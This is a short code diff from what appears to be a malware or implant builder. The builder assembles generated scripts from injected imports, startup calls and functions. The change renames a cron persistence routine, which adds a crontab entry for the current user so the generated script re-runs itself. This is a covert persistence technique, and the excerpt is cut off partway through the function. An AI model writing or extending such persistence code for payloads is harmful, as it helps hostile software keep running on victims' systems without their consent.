@@ -10,9 +10,9 @@ def main(option):
         config.import_statements.append('from getpass import getuser')
         config.import_statements.append('from os import path, getcwd')
         config.import_statements.append('from sys import argv')
-        config.startup.append('cron_persist()')
+        config.startup.append('cron_persist_startup()')
         config.functions.append('''
-def cron_persist():
+def cron_persist_startup():
     cron = CronTab(user=getuser())
     if path.join(getcwd(),path.abspath(argv[0]))[-3:] == '.py':
         job = cron.new(command='python ' + path.join(getcwd(),path.abspath(argv[0])))
